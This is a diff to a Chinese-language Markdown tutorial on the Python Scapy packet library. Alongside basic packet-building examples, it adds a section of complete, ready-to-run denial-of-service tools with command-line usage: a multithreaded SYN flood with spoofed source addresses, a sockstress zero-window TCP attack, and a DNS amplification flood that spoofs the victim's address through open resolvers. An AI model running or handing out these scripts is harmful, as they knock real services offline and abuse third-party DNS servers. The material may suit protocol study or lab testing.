@@ -8,6 +8,9 @@
 ## 特性
 # how
 ## 如何安装
+```bash
+pip3 install scapy
+```
 ## 如何使用
 ### 常用工具函数
 - 列出所有scapy中的命令或函数
@@ -24,6 +27,48 @@ help(sendp)
 ```c
 ls(TCP)
 ls(GRE)
+```
+
+```bash
+>>> from scapy.all import *
+>>> from random import randint
+>>> import time
+>>>
+>>> uuid = randint(1,65534)
+>>> ls(IP)                                                           # 查询IP头部定义
+version    : BitField  (4 bits)                  = (4)
+ihl        : BitField  (4 bits)                  = (None)
+tos        : XByteField                          = (0)
+len        : ShortField                          = (None)
+id         : ShortField                          = (1)
+flags      : FlagsField  (3 bits)                = (<Flag 0 ()>)
+frag       : BitField  (13 bits)                 = (0)
+ttl        : ByteField                           = (64)
+proto      : ByteEnumField                       = (0)
+chksum     : XShortField                         = (None)
+src        : SourceIPField                       = (None)
+dst        : DestIPField                         = (None)
+options    : PacketListField                     = ([])
+>>>
+>>> ip_header = IP(dst="192.168.1.1",ttl=64,id=uuid)           # 构造IP数据包头
+>>> ip_header.show()                                           # 输出构造好的包头
+###[ IP ]###
+  version   = 4
+  ihl       = None
+  tos       = 0x0
+  len       = None
+  id        = 64541
+  flags     =
+  frag      = 0
+  ttl       = 64
+  proto     = ip
+  chksum    = None
+  src       = 192.168.1.101
+  dst       = 192.168.1.1
+  \options   \
+
+>>> ip_header.summary()
+'192.168.1.101 > 192.168.1.1 ip'
 ```
 
 - 显示一个报文摘要
@@ -89,6 +134,15 @@ pkt=Ether(src=xxxx,dst=xxxx)/ip(src=xxxx,dst=xxxx)/TCP(sport=xxxx,dport=xxxx)/Ra
 ```
 
 ### 发送/接受报文函数
+当我们构造好一个数据包后，下一步则是需要将该数据包发送出去，对于发送数据包Scapy中提供了多种发送函数，如下则是不同的几种发包方式，当我们呢最常用的还是sr1()该函数用于发送数据包并只接受回显数据。
+
+send(pkt)：发送三层数据包，但不会收到返回的结果
+sr(pkt)：发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包
+sr1(pkt)：发送三层数据包，仅仅返回接收到响应的数据包
+sendp(pkt)：发送二层数据包
+srp(pkt)：发送二层数据包，并等待响应
+srp1(pkt)：发送第二层数据包，并返回响应的数据包
+
 #### send()方法
 三层以上，不能指定网络接口。
 当loop=1时，一直发包。以下例子为发10个报文，报文间隔为1s。
@@ -110,7 +164,7 @@ sendpfast(pkt,iface,pps,mbps,loop=0)
 #### sr()方法
 发送数据包和接收响应，工作在3层（IP和ARP）。该函数返回有回应的数据包和没有回应的数据包。返回的两个列表数据，第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表。
 
-- sr1()方法
+**sr1()方法**
 与sr类似，工作在3层(IP和ARP)。但它只返回应答发送的分组（或分组集），用来返回一个应答数据包。
 ```c
 >>> pkt1=IP()/ICMP()/Padding(str)  
@@ -159,9 +213,276 @@ pkts= sniff(offline=‘D:\\2019H1work\\igmp.pcap’ )
 >>> pkts[IGMP][0][IGMP].show() #显示IGMP报文第一个报文的IGMP层字段信息
 ```
 
-## 原理
+
 # why
+## 原理
+
+# 应用
+## 模拟synflood的半连接攻击
+```bash
+#coding=utf-8
+import argparse
+import socket,sys,random,threading
+from scapy.all import *
+
+scapy.config.conf.iface = 'ens32'
+
+# 攻击目标主机TCP/IP半开放连接数
+def synflood(target,dstport):
+    # 加锁
+    semaphore.acquire()
+    issrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
+    isport = random.randint(1,65535)
+    ip = IP(src = issrc,dst = target)
+    syn = TCP(sport = isport, dport = dstport, flags = 'S')
+    send(ip / syn, verbose = 0)
+    print("[+] sendp --> {} {}".format(target,isport))
+    # 释放锁
+    semaphore.release()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
+    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
+    parser.add_argument("--type",dest="types",type=str,help="指定攻击的载荷 (synflood)")
+    parser.add_argument("-t","--thread",dest="thread",type=int,help="指定攻击并发线程数")
+    args = parser.parse_args()
+    # 使用方式: main.py --type=synflood -H 192.168.1.1 -p 80 -t 10
+    if args.types == "synflood" and args.host and args.port and args.thread:
+        semaphore = threading.Semaphore(args.thread)
+        while True:
+            t = threading.Thread(target=synflood,args=(args.host,args.port))
+            t.start()
+    else:
+        parser.print_help()
+```
+
+
+执行：
+```bash
+通过传入`--type=synflood -H 192.168.1.1 -p 80 -t 10`参数，
+其含义是对`192.168.1.1`主机的`80`端口执行洪水攻击，并启用`10`个线程执行
+```
+## TCP全连接攻击
+### 介绍
+SockStress 全连接攻击属于`TCP`全连接攻击，其攻击的原理与`SYN Flood`攻击类似，但是它使用完整的TCP三次握手，这使得它更难以检测和防御。
+
+该攻击的关键点就在于，攻击主机**将三次握手的ACK的`windows`窗口缓冲设置为`0`，实现拒绝服务**。攻击者向目标发送一个很小的流量，但是会造成产生的攻击流量是一个巨大的，该攻击消耗的是目标系统的`CPU/内存`资源。
+![](attachments/Pasted%20image%2020240402160450.png)
+
+
+该攻击方式通过与目标主机建立大量的`socket`连接，并且都是完整连接，最后的`ACK`包，将`Window`窗口大小设置为`0`，客户端不接收数据，而服务器此时会认为客户端缓冲区还没有准备好，从而一直等待下去（持续等待将使目标机器内存一直被占用），由于是异步攻击，所以单机模式也可以拒绝高配的服务器。
+
+
+### 实现
+简单实现
+```python3
+import argparse
+import socket,sys,random,threading
+from scapy.all import *
+
+scapy.config.conf.iface = 'eth04'
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
+    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
+    args = parser.parse_args()
+    max_value = 2 ** 32
+    target = args.host
+    dstport = args.port
+    for isn in range(0, max_value):
+        isport = random.randint(0,65535)
+        response = sr1(IP(dst=target)/TCP(sport=isport,dport=dstport,seq=isn,flags="S"),timeout=1,verbose=0)
+        if None != response: 
+            send(IP(dst=target)/ TCP(dport=dstport,sport=isport,window=10000,flags="A",seq=(isn+1), ack=(response[TCP].seq +1))/'\x00\x00',verbose=0)
+        print("[+] sendp --> {} {} {}".format(target,isport,isn))
+```
+
+多线程实现：
+```python3
+#coding=utf-8
+import argparse
+import socket,sys,random,threading
+from scapy.all import *
+
+scapy.config.conf.iface = 'ens32'
+
+# 攻击目标主机的Window窗口
+def sockstress(target,dstport):
+    # 加锁
+    semaphore.acquire()
+    isport = random.randint(0,65535)
+    response = sr1(IP(dst=target)/TCP(sport=isport,dport=dstport,flags="S"),timeout=1,verbose=0)
+    send(IP(dst=target)/ TCP(dport=dstport,sport=isport,window=0,flags="A",ack=(response[TCP].seq +1))/'\x00\x00',verbose=0)
+    print("[+] sendp --> {} {}".format(target,isport))
+    # 释放锁
+    semaphore.release()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
+    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
+    parser.add_argument("--type",dest="types",type=str,help="指定攻击的载荷 (sockstress)")
+    parser.add_argument("-t","--thread",dest="thread",type=int,help="指定攻击并发线程数")
+    args = parser.parse_args()
+    # 使用方式: main.py --type=sockstress -H 192.168.1.1 -p 80 -t 10
+    if args.types == "sockstress" and args.host and args.port and args.thread:
+        semaphore = threading.Semaphore(args.thread)
+        while True:
+            t = threading.Thread(target=sockstress,args=(args.host,args.port))
+            t.start()
+    else:
+        parser.print_help()
+```
+
+
+执行：
+```bash
+通过指定`--type=sockstress -H 192.168.1.1 -p 80 -t 100`
+即可实现对特定主机特定端口的拒绝服务
+```
+
+
+### 其他实现
+**三次握手**
+![](attachments/Pasted%20image%2020240402151627.png)
+
+```python3
+from scapy.all import *
+ 
+dst_ip = "192.168.1.1"
+dst_port = 80
+src_port = 20001
+data = "GET / HTTP/1.0/nihao \r\n\r\n"
+##数据是我随意构造的，一个随便的http请求
+try:
+    ##产生SYN包（FLAG = S 为SYN）
+    spk1 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,flags="S")
+    res1 = sr1(spk1)
+    ack1 = res1[TCP].ack
+    ack2 = res1[TCP].seq + 1
+    ##发送ACK(flag = A),完成三次握手
+    spk2 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,seq=ack1,ack=ack2,falgs="A")
+    send(spk2)
+except Exception as e:
+    print(e)
+##握完手后，由你先给他发第一个数据包，需要照搬第三个包的确认号和验证号，同时flags设值为24,后面跟##数据即可
+da1 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,seq=ack1,ack=ack2,flags=24)/data
+res2 = sr1(da1)
+```
+
+
+**问题**
+在使用Pyhon scapy库构造TCP时，遭遇到系统底层发送的rst包，导致三次握手无法建立情况。
+
+在网上找了很多解决方案，linux相对好解决，直接使用
+```bash
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -d DIP --dport DPORT -j DROP
+```
+可以干掉系统rst包干扰。
+
+
+## 模拟DNS查询放大攻击
+### 介绍
+DNS查询放大攻击是一种利用域名系统（DNS）服务器的缺陷来放大攻击流量的网络攻击。攻击者通过向具有恶意域名的DNS服务器发送DNS查询请求，该服务器会向被攻击者发送响应，但是响应内容比请求更大。攻击者可以利用这种响应的放大效应，将大量流量发送到被攻击者的系统上，从而导致系统资源的耗尽和服务不可用。
+
+该攻击可以通过欺骗和利用DNS协议的特性进行，通常利用UDP端口53来执行。攻击者会伪造一个源IP地址，向DNS服务器发送一个查询请求，请求的数据包比较小，但是响应的数据包比请求的数据包大很多，这就导致了放大的效果。
+
+### DNS包信息
+DNS是域名系统（Domain Name System）的缩写，是一个用于将域名转换为IP地址的分布式数据库系统。在进行DNS查询时，客户端会向DNS服务器发送DNS查询请求（DNS Query，DNSQR）包，DNS服务器则会回应DNS响应（DNS Response，DNSRR）包。
+
+**一个DNSQR包含以下重要的字段**：
+问题域名（QNAME）：需要进行查询的域名
+查询类型（QTYPE）：查询的类型，例如A记录、AAAA记录、CNAME记录等
+查询类（QCLASS）：查询的类别，通常为Internet（IN）
+
+**一个DNSRR包含以下重要的字段**：
+资源记录名称（RR NAME）：资源记录的名称
+资源记录类型（TYPE）：资源记录的类型，例如A记录、AAAA记录、CNAME记录等
+资源记录类（CLASS）：资源记录的类别，通常为Internet（IN）
+生存时间（TTL）：资源记录在DNS缓存中的生存时间
+数据长度（RDLENGTH）：资源记录的数据长度
+资源记录数据（RDATA）：资源记录的数据，例如IPv4地址、IPv6地址、域名等
+
+### 攻击原理
+查询放大攻击的原理是，通过网络中存在的DNS服务器资源，对目标主机发起拒绝服务攻击，通过伪造源地址为被攻击目标的地址，向DNS递归服务器发起查询请求，此时由于源IP是伪造的，固在DNS服务器回包的时候，会默认回给伪造的IP地址，从而使DNS服务成为了流量放大和攻击的实施者，通过查询大量的DNS服务器，从而实现反弹大量的查询流量，导致目标主机查询带宽被塞满，实现DDOS的目的。
+
+查询放大攻击的实施依赖于海量的DNS服务器资源，所以在执行攻击时需要自行寻找这些服务器资源，当找到后则可存储到文件内，当需要使用时首先调用Inspect_DNS_Usability函数依次验证DNS服务器的可用性，并将可用的地址保存为pass.log文件，当需要发起攻击时可通过DNS_Flood调用并传入合法的DNS服务器地址实现DNS查询。
+
+
+### 实现
+```python3
+import os,sys,threading,time
+from scapy.all import *
+import argparse
+
+def Inspect_DNS_Usability(filename):
+    proxy_list = []
+    fp = open(filename,"r")
+    for i in fp.readlines():
+        try:
+            addr = i.replace("\n","")
+            respon = sr1(IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.baidu.com")),timeout=2)
+            if respon != "":
+                proxy_list.append(str(respon["IP"].src))
+        except Exception:
+            pass
+    return proxy_list
+
+def DNS_Flood(target,dns):
+    # 构造IP数据包
+    ip_pack = IP()
+    ip_pack.src = target
+    ip_pack.dst = dns
+#   ip_pack.src = "192.168.1.2"
+#   ip_pack.dst = "8.8.8.8"
+    # 构造UDP数据包
+    udp_pack = UDP()
+    udp_pack.sport = 53
+    udp_pack.dport = 53
+    # 构造DNS数据包
+    dns_pack = DNS()
+    dns_pack.rd = 1
+    dns_pack.qdcount = 1
+    # 构造DNSQR解析
+    dnsqr_pack = DNSQR()
+    dnsqr_pack.qname = "baidu.com"
+    dnsqr_pack.qtype = 255
+    dns_pack.qd = dnsqr_pack
+    respon = (ip_pack/udp_pack/dns_pack)
+    sr1(respon)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--mode",dest="mode",help="选择执行命令<check=检查DNS可用性/flood=攻击>")
+    parser.add_argument("-f","--file",dest="file",help="指定一个DNS字典,里面存储DNSIP地址")
+    parser.add_argument("-t",dest="target",help="输入需要攻击的IP地址")
+    args = parser.parse_args()
+    # 使用方式: main.py --mode=check -f xxx.log
+    if args.mode == "check" and args.file:
+        proxy = Inspect_DNS_Usability(args.file)
+        fp = open("pass.log","w+")
+        for item in proxy:
+            fp.write(item + "\n")
+        fp.close()
+        print("[+] DNS地址检查完毕,当前可用DNS保存为 pass.log")
+    # 使用方式: main.py --mode=flood -f xxx.log -t 192.168.1.1
+    elif args.mode == "flood" and args.target and args.file:
+        with open(args.file,"r") as fp:
+            countent = [line.rstrip("\n") for line in fp]
+            while True:
+                randomDNS = str(random.sample(countent,1)[0])
+                print("[+] 目标主机: {} -----> 随机DNS: {}".format(args.target,randomDNS))
+                t = threading.Thread(target=DNS_Flood,args=(args.target,randomDNS,))
+                t.start()
+    else:
+        parser.print_help()
+```
+
 # 范例
+## 使用scapy 构造 Gre-Erspan type 2的数据包
 如下所示，使用scapy 构造 Gre-Erspan type 2的数据包。其中，Erspan头，在Scapy中并不存在，则使用多个字节来进行构造。
 
 ```python
@@ -251,6 +572,7 @@ if __name__ == '__main__':
     main()
 ```
 
+## 使用scapy构造Gre-Erspan type 1的数据包
 如下所示，构造Gre-Erspan type 1的数据包。
 ```python
 #!/usr/bin/python3
@@ -335,7 +657,7 @@ if __name__ == '__main__':
     main()
 ```
 
-
+## 使用scapy构造自定义头的包
 如下所示，通过 struct pack/unpack 来构造结构体。
 ```c
 #!/usr/bin/python2.6
@@ -476,6 +798,8 @@ if __name__ == '__main__':
 
 
 ```
+
+
 # 参考
 ```c
 官方文档：
@@ -483,6 +807,7 @@ https://scapy.readthedocs.io/en/latest/
 
 中文文档：
 https://alanfanh.github.io/2019/03/08/scapy%E5%8C%85%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/
+
 
 
 https://blog.csdn.net/dive668/article/details/124100923
